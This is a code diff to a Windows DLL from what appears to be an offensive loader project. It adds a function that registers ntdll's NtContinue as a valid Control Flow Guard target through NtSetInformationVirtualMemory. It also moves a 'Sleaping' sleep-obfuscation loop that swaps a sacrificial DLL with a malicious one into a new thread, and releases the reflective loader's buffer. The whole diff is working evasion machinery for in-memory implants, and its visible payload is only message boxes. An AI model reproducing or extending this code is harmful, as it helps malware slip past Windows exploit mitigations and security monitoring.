@@ -528,6 +528,67 @@ EXTERN_DLL_EXPORT bool CrazyLoader() {
 }
 
 
+int CfgAddressAdd(IN HANDLE Process, IN PVOID ImageBase, IN PVOID Function) {
+    CFG_CALL_TARGET_INFO Cfg = { 0 };
+    MEMORY_RANGE_ENTRY   MemRange = { 0 };
+    VM_INFORMATION       VmInfo = { 0 };
+    PIMAGE_NT_HEADERS    NtHeader = { 0 };
+    ULONG                Output = 0;
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll == NULL) {
+        return FALSE;
+    }
+
+    const ULONG VmCfgCallTargetInformation = 2;
+   
+    NtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew);
+    MemRange.NumberOfBytes = (NtHeader->OptionalHeader.SizeOfImage + 0x1000 - 1) & ~(0x1000 - 1);
+    MemRange.VirtualAddress = ImageBase;
+
+    /* set cfg target call info */
+    Cfg.Flags = CFG_CALL_TARGET_VALID;
+    Cfg.Offset = (ULONG_PTR)Function - (ULONG_PTR)ImageBase;
+
+    VmInfo.dwNumberOfOffsets = 1;
+    VmInfo.plOutput = &Output;
+    VmInfo.ptOffsets = &Cfg;
+    VmInfo.pMustBeZero = FALSE;
+    VmInfo.pMoarZero = FALSE;
+
+    NtSetInformationVirtualMemory NtSetInfoVirtualMem = (NtSetInformationVirtualMemory)GetProcAddress(hNtdll, "NtSetInformationVirtualMemory");
+
+	if (!NtSetInfoVirtualMem) {
+		return -1;
+	}
+
+    if (!NT_SUCCESS(NtSetInfoVirtualMem(Process, VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof(VmInfo)))) {
+        
+		return -1;
+    }
+
+	return 0;
+}
+
+VOID CoreFunction(LPVOID lpParam) {
+
+    PCORE_ARGUMENTS CoreArguments = NULL;
+    CoreArguments = (PCORE_ARGUMENTS)lpParam;
+
+    //looping and Sleaping <3
+    do {
+        MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
+        if (Sleaping(CoreArguments->myBase, CoreArguments->sacDLLHandle, CoreArguments->malDLLHandle, CoreArguments->viewSize) == -1) {
+            //nightmares
+            MessageBoxA(NULL, "Sleaping", "With Nightmares", MB_OK | MB_ICONINFORMATION);
+            return;
+        }
+
+
+    } while (TRUE);
+
+}
+
+
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
@@ -542,6 +603,12 @@ BOOL APIENTRY DllMain( HMODULE hModule,
         
         //even if unampped it's in the PEB
         PBYTE myBase = (PBYTE)GetModuleHandleA("SRH.dll");
+
+        //get handle to NTDLL
+        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+		if (hNtdll == NULL) {
+			return FALSE;
+		}
 
         //retrieve the information left from the reflective loader
         //retrieve handle of sac dll
@@ -562,22 +629,29 @@ BOOL APIENTRY DllMain( HMODULE hModule,
         oldMemory = (PBYTE) *pointerToHandle;
 
         //remove the very first buffer allocated for the reflective DLL
-        if (!VirtualFree(oldMemory, 0, MEM_RELEASE)) {    
+        if (VirtualFree(oldMemory, 0, MEM_RELEASE) == 0) {    
             //error releasing old buffer
             return FALSE;
         }
+        //adding NtContinue to valid target as the new SleapingAPC implementation
+        if (CfgAddressAdd(GetCurrentProcess(), hNtdll, GetProcAddress(hNtdll, "NtContinue")) == -1) {
+			//error adding the address
+			return FALSE;
+        }
 
-        //looping and Sleaping <3
-        do {
-            
-            if (Sleaping(myBase, sacDllHandle, malDllHandle, viewSize) == -1) {
-                //nightmares
-                MessageBoxA(NULL, "Sleaping", "With Nightmares", MB_OK | MB_ICONINFORMATION);
-                return FALSE;
-            }
-            MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
-           
-        } while (TRUE);
+        PCORE_ARGUMENTS CoreArguments = (PCORE_ARGUMENTS)VirtualAlloc(NULL, sizeof(CORE_ARGUMENTS), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        CoreArguments->myBase = myBase;
+        CoreArguments->sacDLLHandle = sacDllHandle;
+        CoreArguments->malDLLHandle = malDllHandle;
+        CoreArguments->viewSize = viewSize;
+        
+        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CoreFunction, CoreArguments, 0, NULL);
+
+        if (hThread != NULL) {
+			
+            //saying goodbye to the loader thread
+            ExitThread(0);
+        }
 
         
     }
